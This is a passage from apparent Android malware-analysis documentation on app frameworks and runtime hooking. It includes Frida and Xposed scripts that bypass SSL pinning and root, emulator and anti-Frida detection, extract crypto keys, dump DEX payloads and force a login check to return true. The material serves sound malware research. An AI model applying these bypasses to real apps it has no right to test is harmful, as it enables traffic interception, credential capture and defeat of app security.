Type Security Relevance Camera plugins Photo capture and exfiltration File plugins File system access HTTP plugins Network communication, potential SSL pinning Device plugins IMEI, phone number, device info collection SMS/Contact plugins Data harvesting <p>SSL pinning bypass: Usually implemented via <code>cordova-plugin-advanced-http</code> or a custom Java plugin wrapping OkHttp. Standard Java-layer Frida hooks work:</p> <pre><code>Java.perform(function() {\n    var WebViewClient = Java.use(\"android.webkit.WebViewClient\");\n    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {\n        handler.proceed();\n    };\n});\n</code></pre> <p>Hooking: Modify the JavaScript files directly in the APK, or hook the WebView's JavaScript bridge at runtime:</p> <pre><code>Java.perform(function() {\n    var WebView = Java.use(\"android.webkit.WebView\");\n    WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n        send(\"WebView loading: \" + url);\n        this.loadUrl(url);\n    };\n\n    WebView.evaluateJavascript.implementation = function(script, callback) {\n        send(\"JS injection: \" + script.substring(0, 200));\n        this.evaluateJavascript(script, callback);\n    };\n});\n</code></pre> <p>Security posture: Weakest framework from a reverse engineering perspective. All code is visible, the WebView introduces browser-level attack surface, and JavaScript bridge calls can be intercepted trivially. No compilation barrier exists.</p> <p>Malware context: SpyLoan apps frequently use Cordova or web frameworks to rapidly build predatory lending UIs that harvest contacts, photos, and device data. The web-based architecture allows quick iteration and cross-platform deployment.</p>"},{"location":"reversing/frameworks/#unity-game-engine","title":"Unity (Game Engine)","text":"<p>Architecture: Unity supports two scripting backends with radically different reversibility.</p> <p>Mono backend:</p> <p>C# scripts compile to IL and are stored as standard .NET DLLs in <code>assets/bin/Data/Managed/</code>. Primary target: <code>Assembly-CSharp.dll</code> contains all game scripts.</p> <pre><code>unzip target.apk \"assets/bin/Data/Managed/*\" -d /tmp/unity_mono/\n</code></pre> <p>Open <code>Assembly-CSharp.dll</code> in dnSpy or ILSpy. The decompiled C# is near-source quality with full class hierarchies, method bodies, and string literals. This is the easiest Unity configuration to reverse.</p> <p>IL2CPP backend:</p> <p>C# compiles to C++ which then compiles to native ARM code in <code>libil2cpp.so</code>. The IL is gone. However, <code>global-metadata.dat</code> preserves all class names, method signatures, field names, and string literals as metadata.</p> <p>IL2CPP analysis workflow:</p> <ol> <li>Extract <code>libil2cpp.so</code> and <code>assets/bin/Data/Managed/Metadata/global-metadata.dat</code></li> <li>Run Il2CppDumper with both files as input</li> <li>Il2CppDumper produces <code>dump.cs</code> (C# stubs with method addresses) and <code>script.json</code> (Ghidra/IDA import script)</li> <li>Import the generated script into Ghidra or IDA to annotate <code>libil2cpp.so</code> with recovered symbol names</li> <li>Analyze the annotated native code with full class/method context</li> </ol> Tool Purpose Il2CppDumper Extract metadata and generate C# stubs with native addresses Cpp2IL Alternative to Il2CppDumper, supports newer Unity versions dnSpy Decompile Mono-backend DLLs GameGuardian Runtime memory editing for game state manipulation <p>Hooking:</p> <p>For Mono backend, hook via the Mono runtime. For IL2CPP, use native function addresses from Il2CppDumper output:</p> <pre><code>var il2cpp = Module.findBaseAddress(\"libil2cpp.so\");\nvar targetAddress = il2cpp.add(0x7A3B20);\nInterceptor.attach(targetAddress, {\n    onEnter: function(args) {\n        send(\"IL2CPP method called\");\n    },\n    onLeave: function(retval) {\n        send(\"Return value: \" + retval);\n    }\n});\n</code></pre> <p>Anti-cheat: Many Unity games deploy additional protection layers:</p> Protection Effect on RE GameGuard Kernel-level anti-tamper, blocks debuggers and memory editors EasyAntiCheat Process integrity checks, blocks injection Custom obfuscation String encryption, control flow obfuscation in IL2CPP output Metadata encryption Encrypted <code>global-metadata.dat</code>, requires runtime decryption before Il2CppDumper works <p>For encrypted <code>global-metadata.dat</code>, hook the metadata loading function at runtime and dump the decrypted buffer before Il2CppDumper analysis.</p> <p>Malware context: Goldoson SDK was discovered embedded in over 60 legitimate Unity-based games on the Play Store. The malicious SDK collected device data, installed apps, and Wi-Fi/Bluetooth connected device information. The SDK hid within the game's legitimate native library dependencies.</p>"},{"location":"reversing/frameworks/#nativescript","title":"NativeScript","text":"<p>Architecture: JavaScript or TypeScript code runs on the V8 engine with direct bindings to all native Android APIs. Unlike Cordova, there is no WebView -- V8 executes JavaScript that calls Android APIs directly through generated bindings.</p> <p>Code location: Application bundles are in <code>assets/app/</code>. Extract and analyze as JavaScript:</p> <pre><code>unzip target.apk \"assets/app/*\" -d /tmp/nativescript_out/\n</code></pre> <p>Security implication: NativeScript's direct API bindings mean JavaScript code can call any Android API without requiring a native plugin. A NativeScript app can access contacts, SMS, camera, file system, and network directly from JavaScript. This makes malicious capabilities harder to gate behind plugin installation compared to Cordova.</p> <p>Analysis approach: Similar to React Native. Beautify and read the JavaScript bundles. Search for Android API calls made through the <code>android.</code> namespace in JavaScript. Hook V8 execution or the Java bridge layer with Frida.</p>"},{"location":"reversing/frameworks/#kotlin-multiplatform-kmp","title":"Kotlin Multiplatform (KMP)","text":"<p>Architecture: Shared Kotlin code compiles to JVM bytecode and runs on the standard Android runtime alongside platform-specific Kotlin/Java code. The shared module produces regular <code>.class</code> files that end up in the DEX.</p> <p>Analysis: Standard JADX decompilation works. The shared code appears as normal Kotlin classes in the DEX output. Look for the <code>expect</code>/<code>actual</code> pattern where shared module declarations have platform-specific implementations.</p> <p>No special tooling required. KMP apps are analyzed identically to native Android apps. The shared business logic, networking, and data layers are all visible in DEX. This is the most RE-friendly cross-platform framework since it compiles to the same bytecode as native Kotlin.</p>"},{"location":"reversing/frameworks/#qt-for-android","title":"Qt for Android","text":"<p>Architecture: C++ application using Qt framework, compiled to native ARM code in <code>libQt*.so</code> libraries. The Java layer is a thin wrapper (<code>QtActivity</code>) that bootstraps the Qt runtime.</p> <p>Analysis: All application logic is in native C++ libraries. Requires Ghidra or IDA for analysis. Qt's signal/slot mechanism creates indirect call chains that complicate static analysis. String literals are often in Qt resource files (<code>.qrc</code> compiled into binaries).</p> <p>Hooking: Hook native Qt functions via Frida's Interceptor. Target <code>QNetworkAccessManager</code> for HTTP traffic interception, <code>QSslSocket</code> for SSL bypass.</p>"},{"location":"reversing/frameworks/#corona-solar2d","title":"Corona / Solar2D","text":"<p>Architecture: Lua scripting engine (<code>liblua.so</code>) with a Corona runtime (<code>libcorona.so</code>). Game logic is written in Lua and stored in <code>assets/</code>.</p> <p>Analysis: Extract Lua scripts from the APK. Corona may compile Lua to bytecode (<code>.lu</code> files), which can be decompiled with <code>unluac</code> or <code>luadec</code>. String searches in Lua bytecode remain effective since Lua bytecode preserves string constants.</p>"},{"location":"reversing/frameworks/#cocos2d-x","title":"Cocos2d-x","text":"<p>Architecture: C++ game engine with optional Lua or JavaScript scripting. Native C++ code in <code>libcocos2dlua.so</code> or <code>libcocos2djs.so</code>.</p> <p>Lua variant: Lua scripts in <code>assets/src/</code> may be compiled to bytecode. Extract and decompile with standard Lua tools. Some games encrypt Lua scripts with XOR or custom encryption before packaging.</p> <p>JavaScript variant: JavaScript source in <code>assets/script/</code>. Extract and beautify. V8 or SpiderMonkey engine handles execution.</p> <p>C++ variant: All logic in native <code>libcocos2d*.so</code>. Requires Ghidra/IDA analysis with Cocos2d-x type information.</p>"},{"location":"reversing/frameworks/#ssl-pinning-bypass-by-framework","title":"SSL Pinning Bypass by Framework","text":"Framework Pinning Location Bypass Method Tool React Native JS layer or native TrustManager Patch bundle or Java-layer Frida hook Frida, bundle patching Flutter BoringSSL compiled into <code>libflutter.so</code> Patch <code>ssl_crypto_x509_session_verify_cert_chain</code> reFlutter, Ghidra binary patch Xamarin Mono <code>ServicePointManager</code> or <code>MobileTlsProvider</code> Patch the .dll or Frida mono runtime hook dnSpy, Frida Cordova / Ionic Java plugin (OkHttp) or <code>WebViewClient</code> Standard Java-layer Frida hooks Frida, Objection Unity (Mono) C# <code>UnityWebRequest</code> or embedded OkHttp Patch <code>Assembly-CSharp.dll</code> or Java-layer hook dnSpy, Frida Unity (IL2CPP) Native compiled cert check Il2CppDumper to locate function, Frida native hook Il2CppDumper, Frida NativeScript V8 bridge to Java TrustManager Java-layer Frida hooks Frida Qt <code>QSslSocket</code> in native <code>libQt5Network.so</code> Native Frida hook on SSL verification function Frida, Ghidra Native Android OkHttp <code>CertificatePinner</code>, <code>TrustManager</code>, network security config Standard Java-layer Frida hooks Frida, Objection"},{"location":"reversing/frameworks/#hooking-strategy-by-framework","title":"Hooking Strategy by Framework","text":"Framework Frida Approach Hook Target Effectiveness React Native (JSC) Java bridge hooks + JS bundle patching <code>com.facebook.react.bridge.*</code> classes, native module calls Moderate -- bridge hooks capture cross-boundary calls, full logic requires bundle reading React Native (Hermes) Native hooks on <code>libhermes.so</code> Hermes runtime functions, <code>nativeCallSyncHook</code> Limited -- Hermes internals are complex, bundle decompilation preferred Flutter Native hooks on <code>libapp.so</code> at offsets from blutter Dart function addresses recovered by blutter Moderate -- requires blutter output for meaningful offsets Xamarin Mono runtime hooks or DLL patching <code>mono_jit_runtime_invoke</code>, individual .NET methods via Mono API High -- Mono runtime exposes rich hooking surface Cordova / Ionic WebView hooks + direct JS modification <code>WebView.loadUrl</code>, <code>evaluateJavascript</code>, JS bridge High -- all code is JavaScript, trivially modifiable Unity (Mono) Mono runtime hooks <code>Assembly-CSharp.dll</code> methods via Mono API High -- same as Xamarin Mono Unity (IL2CPP) Native hooks at Il2CppDumper offsets C++ compiled method addresses from metadata dump Moderate -- requires Il2CppDumper preprocessing NativeScript V8 bridge hooks + JS patching Java bridge layer, native API bindings Moderate -- similar to React Native approach Kotlin Multiplatform Standard Java hooks Regular Java/Kotlin methods in DEX High -- identical to native app hooking Qt Native hooks on Qt libraries <code>QNetworkAccessManager</code>, <code>QSslSocket</code>, application-specific functions Low -- dense C++ with Qt abstractions, requires significant Ghidra analysis"},{"location":"reversing/frameworks/#malware-use-of-frameworks","title":"Malware Use of Frameworks","text":"Framework Known Malware Motivation Flutter FluHorse AOT compilation provides inherent obfuscation, jadx produces no output, cross-platform targeting React Native Phishing campaigns, fake banking apps Rapid cross-platform development, single codebase for Android and iOS phishing Cordova / Ionic SpyLoan, predatory lending apps Fastest development cycle, web developer skills sufficient, easy to rebrand Unity Goldoson SDK in legitimate games SDK embedding in popular games provides massive install base .NET MAUI Data theft campaigns (McAfee report) C# logic stored in blob files evades DEX-based scanning engines Native (Java/Kotlin) Majority of banking trojans: Cerberus, GodFather, Anatsa, Octo, Hook, Vultur Full Android API access, mature obfuscation/packing ecosystem, largest developer pool <p>Framework choice correlates with threat actor sophistication. Banking trojan operators with years of experience prefer native Android for maximum control and access to commercial packers. Less sophisticated actors building phishing or data harvesting campaigns choose web-based frameworks (Cordova, React Native) for speed. Flutter adoption by malware authors is increasing as its AOT compilation provides a free obfuscation layer that defeats the standard jadx-based analysis pipeline.</p>"},{"location":"reversing/frameworks/#reverse-engineering-difficulty-ranking","title":"Reverse Engineering Difficulty Ranking","text":"<p>From easiest to hardest for a reverse engineer:</p> Rank Framework Why 1 Cordova / Ionic / Capacitor All code is readable JavaScript in <code>assets/www/</code> 2 Xamarin (Mono) .NET DLLs decompile to near-source C# 3 Unity (Mono) Same as Xamarin -- .NET DLLs in <code>assets/bin/Data/Managed/</code> 4 Kotlin Multiplatform Standard DEX, analyzed with jadx like any native app 5 NativeScript JavaScript bundles, similar to React Native 6 React Native (JSC) Minified but readable JavaScript bundle 7 React Native (Hermes) Requires Hermes bytecode decompilation 8 Corona / Solar2D Lua bytecode decompilation, sometimes encrypted 9 Unity (IL2CPP) Requires Il2CppDumper + Ghidra, but metadata preserves symbols 10 Flutter AOT-compiled Dart with stripped symbols, requires blutter 11 Qt for Android Pure native C++ with Qt abstractions, minimal metadata"},{"location":"reversing/frameworks/#tools-summary","title":"Tools Summary","text":"Tool Framework Target Purpose jadx Native Android, KMP DEX to Java decompilation dnSpy / ILSpy Xamarin, Unity (Mono) .NET IL decompilation to C# blutter Flutter Dart AOT snapshot analysis, symbol recovery reFlutter Flutter SSL bypass and snapshot extraction via <code>libflutter.so</code> patching Il2CppDumper Unity (IL2CPP) Extract metadata from <code>global-metadata.dat</code>, generate C# stubs Cpp2IL Unity (IL2CPP) Alternative IL2CPP analyzer, supports newer Unity versions hbctool React Native (Hermes) Hermes bytecode disassembly and reassembly hermes-dec React Native (Hermes) Hermes bytecode decompilation to JavaScript js-beautify React Native (JSC), Cordova, NativeScript JavaScript formatting and deobfuscation Frida All frameworks Runtime instrumentation and hooking Ghidra Flutter, Unity (IL2CPP), Qt, native libs Native ARM code analysis unluac Corona/Solar2D, Cocos2d-x (Lua) Lua bytecode decompilation"},{"location":"reversing/hooking/","title":"Hooking","text":"<p>Intercepting function calls at runtime to read arguments, modify return values, or replace functionality entirely. Frida is the standard tool for Android hooking. Xposed provides a framework-level alternative.</p>"},{"location":"reversing/hooking/#frida","title":"Frida","text":"<p>Frida injects a JavaScript engine into the target process. Scripts can hook any Java method, native function, or system call.</p>"},{"location":"reversing/hooking/#setup","title":"Setup","text":"<pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\nadb shell su -c \"/data/local/tmp/frida-server &amp;\"\n\npip install frida-tools\n</code></pre>"},{"location":"reversing/hooking/#basic-java-hooking","title":"Basic Java Hooking","text":"<p>Intercept a Java method, read arguments, modify return value:</p> <pre><code>Java.perform(function() {\n    var targetClass = Java.use(\"com.target.app.LoginActivity\");\n\n    targetClass.checkPassword.implementation = function(password) {\n        console.log(\"Password entered: \" + password);\n        var result = this.checkPassword(password);\n        console.log(\"Result: \" + result);\n        return true;\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#hooking-overloaded-methods","title":"Hooking Overloaded Methods","text":"<p>When a method has multiple signatures:</p> <pre><code>targetClass.send.overload(\"java.lang.String\", \"int\").implementation = function(msg, code) {\n    console.log(\"send(\" + msg + \", \" + code + \")\");\n    return this.send(msg, code);\n};\n</code></pre>"},{"location":"reversing/hooking/#hooking-constructors","title":"Hooking Constructors","text":"<pre><code>targetClass.$init.overload(\"java.lang.String\").implementation = function(param) {\n    console.log(\"Constructor called with: \" + param);\n    this.$init(param);\n};\n</code></pre>"},{"location":"reversing/hooking/#native-function-hooking","title":"Native Function Hooking","text":"<p>Hook native (C/C++) functions in shared libraries:</p> <pre><code>Interceptor.attach(Module.findExportByName(\"libnative.so\", \"decrypt\"), {\n    onEnter: function(args) {\n        console.log(\"decrypt called\");\n        console.log(\"arg0: \" + Memory.readUtf8String(args[0]));\n    },\n    onLeave: function(retval) {\n        console.log(\"returned: \" + Memory.readUtf8String(retval));\n    }\n});\n</code></pre>"},{"location":"reversing/hooking/#common-hooking-tasks","title":"Common Hooking Tasks","text":""},{"location":"reversing/hooking/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>The most frequent use case. Multiple approaches depending on the pinning implementation:</p> <pre><code>Java.perform(function() {\n    var CertificatePinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertificatePinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(hostname, peerCertificates) {\n        console.log(\"Bypassing pin for: \" + hostname);\n    };\n});\n</code></pre> <p>For comprehensive pinning bypass, Objection automates this:</p> <pre><code>objection -g com.target.app explore\nandroid sslpinning disable\n</code></pre>"},{"location":"reversing/hooking/#root-detection-bypass","title":"Root Detection Bypass","text":"<p>Hook root check methods to return false. The example below covers basic RootBeer checks, but production malware uses multi-layered detection (file checks, property reads, native library probes). 8kSec's advanced root detection bypass guide covers sophisticated detection mechanisms and Frida-based bypasses beyond basic library hooks:</p> <pre><code>Java.perform(function() {\n    var RootBeer = Java.use(\"com.scottyab.rootbeer.RootBeer\");\n    RootBeer.isRooted.implementation = function() {\n        console.log(\"Root check bypassed\");\n        return false;\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#emulator-detection-bypass","title":"Emulator Detection Bypass","text":"<pre><code>Java.perform(function() {\n    var Build = Java.use(\"android.os.Build\");\n    Build.FINGERPRINT.value = \"google/walleye/walleye:8.1.0/OPM1.171019.011/4448085:user/release-keys\";\n    Build.MODEL.value = \"Pixel 2\";\n    Build.MANUFACTURER.value = \"Google\";\n    Build.BRAND.value = \"google\";\n    Build.PRODUCT.value = \"walleye\";\n    Build.HARDWARE.value = \"walleye\";\n});\n</code></pre>"},{"location":"reversing/hooking/#crypto-key-extraction","title":"Crypto Key Extraction","text":"<p>Hook encryption functions to dump keys and plaintext:</p> <pre><code>Java.perform(function() {\n    var SecretKeySpec = Java.use(\"javax.crypto.spec.SecretKeySpec\");\n    SecretKeySpec.$init.overload(\"[B\", \"java.lang.String\").implementation = function(keyBytes, algorithm) {\n        console.log(\"Algorithm: \" + algorithm);\n        console.log(\"Key: \" + bytesToHex(keyBytes));\n        return this.$init(keyBytes, algorithm);\n    };\n\n    var Cipher = Java.use(\"javax.crypto.Cipher\");\n    Cipher.doFinal.overload(\"[B\").implementation = function(input) {\n        console.log(\"Cipher input: \" + bytesToHex(input));\n        var result = this.doFinal(input);\n        console.log(\"Cipher output: \" + bytesToHex(result));\n        return result;\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#dex-loading-interception","title":"DEX Loading Interception","text":"<p>Capture dynamically loaded DEX files (packed apps):</p> <pre><code>Java.perform(function() {\n    var DexClassLoader = Java.use(\"dalvik.system.DexClassLoader\");\n    DexClassLoader.$init.implementation = function(dexPath, optimizedDir, libraryPath, parent) {\n        console.log(\"Loading DEX: \" + dexPath);\n        this.$init(dexPath, optimizedDir, libraryPath, parent);\n    };\n\n    var InMemoryDexClassLoader = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n    InMemoryDexClassLoader.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\").implementation = function(buf, loader) {\n        console.log(\"In-memory DEX loaded, size: \" + buf.remaining());\n        var bytes = new Uint8Array(buf.remaining());\n        var file = new File(\"/data/local/tmp/dumped_\" + Date.now() + \".dex\", \"wb\");\n        file.write(bytes.buffer);\n        file.flush();\n        file.close();\n        this.$init(buf, loader);\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#advanced-frida-memory-operations","title":"Advanced Frida: Memory Operations","text":"<p>Beyond hooking functions, Frida provides direct memory manipulation APIs for native-level analysis. 8kSec's memory operations series covers the full API:</p> API Purpose <code>Memory.scan()</code> / <code>Memory.scanSync()</code> Scan process memory for byte patterns <code>Memory.alloc()</code> Allocate memory in the target process <code>Memory.copy()</code> / <code>Memory.dup()</code> Copy and duplicate memory regions <code>Memory.protect()</code> Change memory page permissions (RWX) <code>Memory.patchCode()</code> Patch executable code at runtime <p>8kSec's Frida Stalker guide covers instruction-level tracing using Stalker APIs, enabling real-time observation of code execution at the assembly level. This is particularly useful for analyzing obfuscated native code in families like Mandrake that use OLLVM.</p>"},{"location":"reversing/hooking/#anti-frida-detection-and-bypass","title":"Anti-Frida Detection and Bypass","text":"<p>Malware actively detects Frida to prevent dynamic analysis. Understanding each detection vector is necessary to bypass them.</p>"},{"location":"reversing/hooking/#detection-techniques","title":"Detection Techniques","text":"Detection Method Indicator Implementation Port scanning TCP port 27042 (default frida-server port) Socket connect to localhost:27042, if open assume Frida is present Process name \"frida-server\" in process list Read <code>/proc/*/cmdline</code> or <code>ps</code> output looking for \"frida\" Memory maps scanning \"frida\" strings in <code>/proc/self/maps</code> Open <code>/proc/self/maps</code> and scan for \"frida-agent\", \"frida-gadget\", or \"frida-server\" Named pipes Frida's linjector pipe names Enumerate <code>/proc/self/fd/</code> for pipes matching \"linjector\" pattern Loaded libraries <code>frida-agent*.so</code> in memory <code>dlopen</code> enumeration or <code>/proc/self/maps</code> check for frida-agent shared objects pthread_create hooking Thread creation patterns Frida spawns threads during injection -- detect abnormal thread count or thread naming patterns D-Bus protocol detection Frida's internal D-Bus communication Send D-Bus <code>AUTH</code> message to suspected Frida port and check for a valid reply Inline hook detection Modified function prologues Read the first bytes of commonly hooked functions (like <code>open</code>, <code>strcmp</code>) and compare against known-good prologues"},{"location":"reversing/hooking/#procselfmaps-scanning-most-common","title":"<code>/proc/self/maps</code> Scanning (Most Common)","text":"<p>The most widespread Frida detection reads <code>/proc/self/maps</code> line by line, searching for Frida-related strings. Malware typically runs this in a background thread on a timer:</p> <pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"java.lang.String\").implementation = function(cmd) {\n        if (cmd.indexOf(\"maps\") !== -1 || cmd.indexOf(\"frida\") !== -1) {\n            console.log(\"Blocked maps/frida scan: \" + cmd);\n            return this.exec(\"echo\");\n        }\n        return this.exec(cmd);\n    };\n});\n</code></pre> <p>For native-level maps scanning, hook <code>libc.so</code> <code>open</code> and filter <code>/proc/self/maps</code> access:</p> <pre><code>Interceptor.attach(Module.findExportByName(\"libc.so\", \"open\"), {\n    onEnter: function(args) {\n        var path = Memory.readUtf8String(args[0]);\n        if (path &amp;&amp; path.indexOf(\"/proc/self/maps\") !== -1) {\n            this.shouldBlock = true;\n        }\n    },\n    onLeave: function(retval) {\n        if (this.shouldBlock) {\n            retval.replace(-1);\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/hooking/#d-bus-protocol-detection","title":"D-Bus Protocol Detection","text":"<p>Some malware sends a raw D-Bus <code>AUTH</code> handshake to suspected Frida ports. If Frida responds, the app terminates:</p> <pre><code>Interceptor.attach(Module.findExportByName(\"libc.so\", \"connect\"), {\n    onEnter: function(args) {\n        var sockAddr = args[1];\n        var port = (Memory.readU8(sockAddr.add(2)) &lt;&lt; 8) | Memory.readU8(sockAddr.add(3));\n        if (port === 27042) {\n            console.log(\"Blocked connect to Frida port\");\n            this.shouldBlock = true;\n        }\n    },\n    onLeave: function(retval) {\n        if (this.shouldBlock) {\n            retval.replace(-1);\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/hooking/#bypass-strategies","title":"Bypass Strategies","text":"Strategy How Trade-offs Rename frida-server <code>cp frida-server fs-15.x</code> and run the renamed binary Simple but only evades name-based detection Non-default port <code>frida-server -l 0.0.0.0:1234</code> Defeats port 27042 scanning only Frida Gadget injection Embed <code>frida-gadget.so</code> directly into the APK's lib folder No frida-server process, survives process name checks Hook detection functions Intercept <code>open()</code>, <code>fopen()</code>, <code>access()</code> calls targeting <code>/proc/self/maps</code> Comprehensive but can be detected by syscall-level checks Magisk + Shamiko Use Shamiko to hide root and Frida from process Hides at zygote level, effective against most checks Stalker-based tracing Use Frida Stalker instead of Interceptor to avoid inline hook artifacts Slower but undetectable by prologue checking Kernel-level hiding Custom kernel module to filter <code>/proc/self/maps</code> entries Most thorough, requires custom kernel Patch detection out Remove Frida detection entirely from the APK (see Patching) Permanent fix, avoids the cat-and-mouse entirely"},{"location":"reversing/hooking/#frida-gadget-rootless-injection","title":"Frida Gadget (Rootless Injection)","text":"<p>When root is unavailable or frida-server is detected, inject Frida Gadget directly into the APK:</p> <pre><code>apktool d target.apk -o target_patched/\ncp frida-gadget-16.x.x-android-arm64.so target_patched/lib/arm64-v8a/libfrida-gadget.so\n</code></pre> <p>Add a <code>System.loadLibrary</code> call in the main activity's Smali to load the gadget at startup:</p> <pre><code>const-string v0, \"frida-gadget\"\ninvoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V\n</code></pre> <p>Reassemble, sign, and install. The app loads Frida Gadget on launch without needing frida-server.</p>"},{"location":"reversing/hooking/#xposed-framework","title":"Xposed Framework","text":"<p>Xposed operates at the ART (Android Runtime) level, replacing method entry points in the runtime's internal method table. When a hooked method is called, ART redirects execution to the Xposed callback before (or instead of) the original implementation.</p> <p>LSPosed is the modern Xposed implementation for Android 8.1+, installed as a Magisk module. It uses Riru or Zygisk to inject into the zygote process, which means hooks are active from the moment an app process is forked.</p>"},{"location":"reversing/hooking/#how-art-method-hooking-works","title":"How ART Method Hooking Works","text":"<p>Xposed replaces the <code>entry_point_from_quick_compiled_code</code> field in ART's <code>ArtMethod</code> struct. When the VM calls a hooked method, it jumps to Xposed's trampoline instead of the original compiled code. The trampoline invokes registered callbacks, then optionally calls the original method.</p> <p>This is fundamentally different from Frida's approach: Frida injects into a running process and patches code in memory, while Xposed modifies the runtime's method dispatch table at process creation time.</p>"},{"location":"reversing/hooking/#lsposed-module-structure","title":"LSPosed Module Structure","text":"<p>An Xposed module is an Android app with a <code>xposed_init</code> file declaring the entry class:</p> <pre><code>public class HookModule implements IXposedHookLoadPackage {\n    @Override\n    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {\n        if (!lpparam.packageName.equals(\"com.target.malware\")) return;\n\n        XposedHelpers.findAndHookMethod(\n            \"com.target.malware.SecurityCheck\",\n            lpparam.classLoader,\n            \"isRooted\",\n            new XC_MethodReplacement() {\n                @Override\n                protected Object replaceHookedMethod(MethodHookParam param) {\n                    return false;\n                }\n            }\n        );\n    }\n}\n</code></pre> <p>For before/after hooks instead of full replacement:</p> <pre><code>XposedHelpers.findAndHookMethod(\n    \"javax.crypto.Cipher\",\n    lpparam.classLoader,\n    \"doFinal\",\n    byte[].class,\n    new XC_MethodHook() {\n        @Override\n        protected void beforeHookedMethod(MethodHookParam param) {\n            byte[] input = (byte[]) param.args[0];\n            XposedBridge.log(\"Cipher.doFinal input: \" + bytesToHex(input));\n        }\n        @Override\n        protected void afterHookedMethod(MethodHookParam param) {\n            byte[] output = (byte[]) param.getResult();\n            XposedBridge.log(\"Cipher.doFinal output: \" + bytesToHex(output));\n        }\n    }\n);\n</code></pre>"},{"location":"reversing/hooking/#frida-vs-xposed","title":"Frida vs. Xposed","text":"Aspect Frida Xposed / LSPosed Hook timing Attaches to running process Active from process creation (zygote fork) Persistence Script must be re-run each session Hooks survive app restarts and reboots Iteration speed Instant -- edit JS script, re-attach Requires module rebuild and device reboot Module changes Immediate Requires reboot (or soft reboot via LSPosed manager) Language JavaScript (with Java.perform bridge) Java / Kotlin Root requirement Yes (frida-server) or Gadget injection Yes (Magisk + LSPosed) Detection surface Detectable via port, maps, thread artifacts Lower profile -- no separate server process Native hooks Full support (Interceptor, Stalker) Limited -- primarily targets Java/ART methods Interactive exploration REPL, live scripting, object inspection No REPL -- compile, install, reboot cycle Best for Dynamic exploration, one-off analysis Persistent monitoring, long-running malware observation <p>Xposed is particularly useful when analyzing malware that actively detects Frida, since LSPosed hooks leave fewer artifacts. It is also preferable for long-running observation sessions where restarting Frida scripts is impractical.</p>"},{"location":"reversing/hooking/#family-specific-hooking","title":"Family-Specific Hooking","text":"<p>Certain malware families require targeted hooks to extract key data:</p> Family What to Hook Purpose Cerberus lineage <code>javax.crypto.Cipher.doFinal</code> Decrypt C2 communication and overlay inject URLs GodFather v3 VirtualApp framework APIs Intercept virtualized banking app interactions Anatsa AccessibilityService.onAccessibilityEvent Observe ATS command sequence Mandrake OLLVM-protected native functions via Stalker Trace obfuscated control flow SharkBot DGA algorithm function Predict future C2 domains Vultur AlphaVNC initialization Capture screen streaming setup SpyNote Socket/DataOutputStream Intercept RAT command protocol Necro BitmapFactory + pixel extraction Capture steganographic payload Gigabud <code>libstrategy.so</code> native functions Intercept UI interaction commands BTMOB RAT WebView <code>loadUrl</code> / <code>evaluateJavascript</code> Capture injected phishing pages LightSpy Plugin loader + <code>light2.db</code> SQLite Intercept plugin download and C2 config FluHorse Dart FFI bridge in <code>libapp.so</code> Hook the Dart-to-native boundary for credential interception Rafel RAT <code>DevicePolicyManager</code> + <code>Cipher.doFinal</code> Intercept admin commands and ransomware encryption KoSpy Firebase Firestore <code>getDocument</code> Capture C2 configuration delivery All packed families DexClassLoader, InMemoryDexClassLoader Dump decrypted DEX payload"},{"location":"reversing/hooking/#accessibility-service-monitoring","title":"Accessibility Service Monitoring","text":"<p>For families using accessibility-based ATS, hook the accessibility service to observe the full fraud sequence:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            try {\n                var cls = Java.use(className);\n                if (cls.class.getSuperclass() &amp;&amp;\n                    cls.class.getSuperclass().getName() === \"android.accessibilityservice.AccessibilityService\") {\n                    cls.onAccessibilityEvent.implementation = function(event) {\n                        console.log(\"[A11y] \" + event.getEventType() + \" pkg=\" + event.getPackageName() + \" text=\" + event.getText());\n                        this.onAccessibilityEvent(event);\n                    };\n                }\n            } catch(e) {}\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/hooking/#refrida","title":"reFrida","text":"<p>reFrida is a browser-based Frida IDE that replaces the typical workflow of editing scripts in a text editor and running them via CLI. It connects to a running frida-server and provides a full development environment in the browser.</p> <p>Key capabilities:</p> <ul> <li>Monaco editor with Frida API autocompletion, syntax highlighting, and inline documentation</li> <li>Visual interceptor builder -- select a class and method from a tree view, and reFrida generates the hook code automatically. Useful for quickly building hooks without memorizing overload signatures.</li> <li>Built-in disassembler -- disassemble native functions directly from the browser, navigate to cross-references, and set hooks on specific instructions</li> <li>Memory search -- scan process memory for strings, byte patterns, or values with a visual interface (wraps <code>Memory.scan</code> with result highlighting)</li> <li>Stalker integration -- configure and run Stalker traces with visual output of executed basic blocks and call graphs</li> <li>Script management -- save, load, and organize scripts per target application</li> </ul> <p>reFrida is particularly effective for malware analysis workflows where you need to rapidly iterate on hooks, inspect memory regions, and trace native code execution without switching between multiple terminal sessions.</p>"},{"location":"reversing/hooking/#task-oriented-hooking-strategies","title":"Task-Oriented Hooking Strategies","text":"<p>Beyond family-specific hooks, certain analysis goals map to standard hook points regardless of the malware family:</p> Analysis Goal What to Hook Why Intercept overlay injection <code>WindowManager.addView</code>, <code>WindowManager.LayoutParams</code> Banking trojans overlay fake login screens on top of legitimate apps Capture C2 traffic <code>OkHttpClient.newCall</code>, <code>HttpURLConnection.connect</code>, <code>URL.openConnection</code> Intercept HTTP-based C2 before SSL encryption Extract encryption keys <code>SecretKeySpec.$init</code>, <code>Cipher.doFinal</code>, 